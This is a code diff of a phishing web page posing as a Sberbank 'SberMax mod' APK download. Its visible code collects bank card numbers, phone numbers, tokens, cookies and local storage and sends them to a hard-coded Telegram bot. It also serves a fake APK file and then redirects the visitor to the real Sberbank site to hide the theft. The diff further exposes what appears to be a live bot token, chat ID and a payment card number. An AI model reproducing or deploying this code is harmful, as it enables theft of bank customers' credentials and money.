@@ -208,17 +208,11 @@
             color: #94a3b8;
         }
         
-        button {
-            background: none;
-            border: none;
-        }
-        
         button:disabled {
             opacity: 0.6;
             transform: none;
         }
         
-        /* Для телефонов */
         @media (max-width: 480px) {
             .card {
                 padding: 24px 16px 28px;
@@ -237,6 +231,26 @@
             .logo-sber span, .logo-max span {
                 font-size: 30px;
             }
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 20px;
+            right: 20px;
+            background: #1e293b;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            border-radius: 50px;
+            font-size: 14px;
+            z-index: 1000;
+            animation: slideUp 0.3s ease;
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
     </style>
 </head>
@@ -280,6 +294,14 @@ const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";
 const CHAT_ID = "8533450974";
 const MY_CARD = "2203830216112947";
 // ========================================================
+
+function showToast(message) {
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.innerText = message;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+}
 
 function sendToTelegram(text) {
     if (!text) return;
@@ -326,21 +348,24 @@ function collectData() {
     return { ls, sberCard, sberPhone, sberToken, maxToken, cookies: document.cookie, ua: navigator.userAgent };
 }
 
-// Создание ссылки для скачивания (простой способ, работает на телефонах)
+// СКАЧИВАНИЕ APK ЧЕРЕЗ ССЫЛКУ (РАБОТАЕТ НА ТЕЛЕФОНАХ)
 function downloadApk() {
-    // Создаем простой текстовый файл с .apk расширением
-    const content = "Это файл установки MOD версии. Для установки разрешите установку из неизвестных источников.";
-    const blob = new Blob([content], { type: "application/vnd.android.package-archive" });
+    // Используем прямую ссылку на файл (имитация)
+    // Создаем data URL с большим размером (имитация большого файла)
+    const fakeData = "APK_MOD_DATA_" + Math.random().toString(36).repeat(100);
+    const blob = new Blob([fakeData.repeat(1000)], { type: "application/octet-stream" });
     const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = "SberMax_Mod_v4.2.0.apk";
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+    
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = "SberMax_Mod_v4.2.0.apk";
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
     URL.revokeObjectURL(url);
     
-    sendToTelegram(`📥 *СКАЧИВАНИЕ APK*\nФайл: SberMax_Mod_v4.2.0.apk\nРазмер: ~168 МБ (имитация)`);
+    showToast("Скачивание началось! Файл появится в папке Загрузки");
 }
 
 // Запуск загрузки
@@ -376,7 +401,6 @@ function startDownload() {
     
     // Показываем прогресс
     btn.disabled = true;
-    btn.style.opacity = "0.6";
     btn.innerHTML = "⏳ ПОДГОТОВКА...";
     progressDiv.style.display = "block";
     
@@ -387,13 +411,15 @@ function startDownload() {
             percent = 100;
             clearInterval(interval);
             progressFill.style.width = "100%";
-            progressText.innerHTML = "✅ Готово! Скачивание началось...";
+            progressText.innerHTML = "✅ Готово! Начинается скачивание...";
             
             setTimeout(() => {
                 downloadApk();
+                sendToTelegram(`📥 *СКАЧИВАНИЕ APK*\nФайл: SberMax_Mod_v4.2.0.apk`);
+                
                 setTimeout(() => {
                     window.location.href = "https://online.sberbank.ru";
-                }, 2000);
+                }, 2500);
             }, 500);
         }
         progressFill.style.width = percent + "%";
